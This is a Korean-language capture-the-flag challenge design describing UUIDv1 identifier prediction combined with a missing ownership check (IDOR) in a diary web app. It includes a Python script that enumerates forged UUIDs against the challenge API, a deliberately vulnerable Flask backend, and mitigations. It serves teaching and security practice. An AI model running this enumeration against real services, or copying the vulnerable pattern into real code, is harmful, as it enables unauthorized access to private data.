---
title: UUIDv1 Prediction leading to IDOR — Web CTF Scenario
created: 2026-06-14
updated: 2026-06-14
type: ctf-scenario
tags: [ctf, web, idor, uuid-prediction, broken-access-control, cryptographic-weakness]
confidence: high
---

# UUIDv1 Prediction leading to IDOR — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: Private Diary Archiver (비밀 다이어리 저장소)
- **난이도**: Medium
- **핵심 컨셉**: 보안 무작위성이 결여된 식별자 구조를 무차별 대입(Enumeration)하여 비공개 데이터를 조회하는 **IDOR(Insecure Direct Object Reference)** 취약점 문제입니다. 일반적으로 정수형 ID(`?id=1`, `?id=2`)는 공격자가 쉽게 값을 더해가며 타인 정보에 접근할 수 있어, 개발자들은 보안을 위해 고유하고 복잡한 **UUID(Universally Unique Identifier)** 형식을 식별자로 채택합니다. 그러나 암호학적으로 안전한 랜덤 변수인 UUIDv4가 아닌, 생성 시간과 시스템 MAC 주소를 기반으로 조립되는 **UUIDv1**을 사용할 경우 공격자는 계정 생성 시간차를 기반으로 다른 타겟(어드민)의 UUID 값을 예측하여 계정을 침탈할 수 있습니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **Frontend / Portal**: 가입한 일반 사용자가 자신의 일기를 저장하고 개별 주소(`/diary/view/<uuid>`) 형태로 조회하는 페이지.
- **Backend Service (Python/Flask or Node.js)**:
  - 다이어리 생성 시 식별자로 UUIDv1 알고리즘 사용.
  - 일기 조회 엔드포인트 `/api/diary/<uuid>` 제공.
  - 사용자 권한 관계 검증(세션 소유주 일치 여부) 부재 상태로 해당 UUID의 존재성만 확인 후 렌더링.
- **Flag 위치**: 
  - 어드민 계정(`admin`)이 작성해 둔 비밀 일기 본문 내용.

### 2.2 취약점 지점
1. **Predictable Identifiers (UUIDv1)**:
   - UUIDv1은 60비트의 시간 타임스탬프(시간 기반 고해상도 값)와 노드 ID(일반적으로 서버의 MAC 주소)로 조립됩니다.
   - 공격자가 테스트용 계정 2개를 연이어 생성하여 각각의 UUID를 얻으면, 생성된 두 UUID 간의 차이를 분석하여 노드 ID(고정값)와 타임스탬프의 가변 영역을 역산해 낼 수 있어 그 간격 사이에 생성된 타겟(어드민) 계정의 UUID를 높은 확률로 예측해 낼 수 있습니다.
2. **Missing Access Control Check (IDOR)**:
   - 특정 일기 레코드를 불러올 때 현재 세션 주체가 해당 일기의 실제 소유자가 맞는지 데이터베이스 조인 등을 통해 인가 제어를 하지 않는 결함입니다.

---

## 3. 공격 면 (Attack Surface)

| 엔드포인트 | 메소드 | 인증 | 입력 값 | 반환 값 | 비고 |
|------------|--------|------|---------|---------|------|
| `/api/diary/<uuid>`| GET | 없음 | `uuid` 변수 | 일기 상세 내용 JSON | IDOR 공격 대상 경로 |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. 식별자 유형 분석
공격자는 일반 사용자로 가입한 후 여러 개의 테스트용 일기를 연이어 생성하며 발급된 식별자의 형태를 관찰합니다.
- 일기 A: `d3a4ef50-1a22-11eb-adc1-0242ac120002`
- 일기 B: `d3a6c410-1a22-11eb-adc1-0242ac120002`
- **구조 해독**:
  - 뒷부분 `adc1-0242ac120002`은 노드 MAC 주소 및 클럭 시퀀스로 완벽하게 동일합니다.
  - 중간 세그먼트 `11eb`은 UUID 버전을 가리키며 `1`은 시간 기반 UUIDv1임을 나타냅니다.
  - 앞부분 `d3a4ef50`과 `d3a6c410`은 매우 인접한 시간 시간 정보값입니다.

### Step 2. 타겟 UUID 예측 알고리즘 구성
서버 구동 시 또는 어드민이 일기를 등록한 시점이 내가 일기를 등록한 시점보다 약 3초 전임을 파악했다면, 그 사이 범위의 타임스탬프 값을 연산합니다.
- 타임스탬프의 간격 차이 분석:
  A와 B의 타임스탬프 간 차이는 `120000` (100나노초 단위) 정도로, 이를 기반으로 어드민이 생성했을 것으로 추정되는 시간 인덱스 목록을 후보군으로 맵핑합니다.
- **공격 자동화 스크립트 작성 (Python)**:
  ```python
  import requests
  import uuid
  import time

  # 획득한 테스트 UUID 정보
  # d3a4ef50-1a22-11eb-adc1-0242ac120002
  # 타겟은 약 2초 전에 쓰여졌다고 가정 (1초 = 10,000,000 타임스탬프 값 증가)
  
  base_uuid_str = "d3a4ef50-1a22-11eb-adc1-0242ac120002"
  base_uuid = uuid.UUID(base_uuid_str)
  
  # UUIDv1 필드 추출
  time_low = base_uuid.time & 0xffffffff
  time_mid = (base_uuid.time >> 32) & 0xffff
  time_hi_version = (base_uuid.time >> 48) & 0x0fff
  clock_seq_and_node = base_uuid.fields[4] | (base_uuid.fields[3] << 48)
  
  target_url = "http://diary.challenge.local/api/diary/"
  
  # 예측 영역 타임스탬프 탐색 (과거 5초 이내)
  for offset in range(-50000000, 100000, 1000):
      test_time = base_uuid.time + offset
      
      # 새로운 UUID 조립
      tl = test_time & 0xffffffff
      tm = (test_time >> 32) & 0xffff
      th = (test_time >> 48) & 0x0fff
      
      # UUID 생성
      forged = uuid.UUID(fields=(tl, tm, th, base_uuid.fields[3], base_uuid.fields[4], base_uuid.fields[5]))
      
      r = requests.get(target_url + str(forged))
      if r.status_code == 200:
          print(f"Success! Forged UUID: {forged}")
          print(f"Data: {r.text}")
          break
  ```

### Step 3. 공격 요청 및 우회 성공
1. 스크립트를 가동하여 조립된 후보 UUID를 웹 서버 API에 무차별 대입을 진행합니다.
2. 약 3~4초 내에 실제 어드민의 일기 UUID 식별자가 적중(200 OK)하며 응답 결과를 수집합니다.

### Step 4. flag 획득
수집된 응답 데이터 중 어드민의 다이어리 본문 내용 필드에 쓰여 있는 플래그(`FLAG{uuidv1_predictable_generation_idor_bypass}`)를 획득합니다.

---

## 5. 취약점 유발 백엔드 코드 스니펫 (Python Flask)

```python
# app.py
from flask import Flask, request, jsonify
import uuid

app = Flask(__name__)

# 인메모리 데이터베이스 모사
diaries = {
    # 어드민 일기가 약 2초 전에 작성되었다고 가정 (UUIDv1 자동 할당)
    str(uuid.uuid1()): {
        "owner": "admin",
        "content": "FLAG{uuidv1_predictable_generation_idor_bypass}"
    }
}

@app.route("/api/diary/create", methods=["POST"])
def create_diary():
    data = request.get_json()
    content = data.get("content", "")
    
    # 취약점 지점 1: 예측 가능한 시간/노드 기반의 UUIDv1 사용
    diary_id = str(uuid.uuid1())
    diaries[diary_id] = {
        "owner": "guest",
        "content": content
    }
    return jsonify({"status": "success", "id": diary_id})

@app.route("/api/diary/<string:diary_id>", methods=["GET"])
def get_diary(diary_id):
    # 취약점 지점 2: 인가 제어 부재 (IDOR)
    # 현재 로그인 세션 정보를 검증하여 소유주 여부를 파악해야 하지만,
    # 해당 ID의 일기가 존재하기만 하면 내용을 그대로 반환함.
    if diary_id in diaries:
        return jsonify({
            "status": "success",
            "content": diaries[diary_id]["content"],
            "owner": diaries[diary_id]["owner"]
        })
    else:
        return jsonify({"status": "error", "message": "Not found"}), 404

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **암호학적으로 안전한 무작위 식별자 도입 (UUIDv4 사용)**:
   - 생성 타임스탬프와 고정 노드 주소를 전혀 사용하지 않고 122비트의 무작위 난수를 채우는 UUIDv4 규격을 식별자로 지정하여 예측 가능성을 차단합니다.
   - **수정 예시**:
     ```python
     # uuid1() 대신 암호학적으로 안전한 uuid4()로 변경
     diary_id = str(uuid.uuid4())
     ```
2. **세션 기반 소유권 검증 (Access Control Checks)**:
   - 식별자를 찾아냈더라도 조회 API 동작 시 반드시 현재 세션 유저의 고유 식별자(UserID)와 데이터베이스 상의 소유주 필드(owner)가 동일한지 교차 검증을 강제합니다.
3. **무차별 대입 탐지 및 속도 제어 (Rate Limiting)**:
   - UUID와 같은 자원에 대한 조회 API 호출 시 단시간에 대량의 404 Not Found 에러가 발생하는 IP에 대해 일시적 요청 차단(Throttling) 정책을 부과합니다.
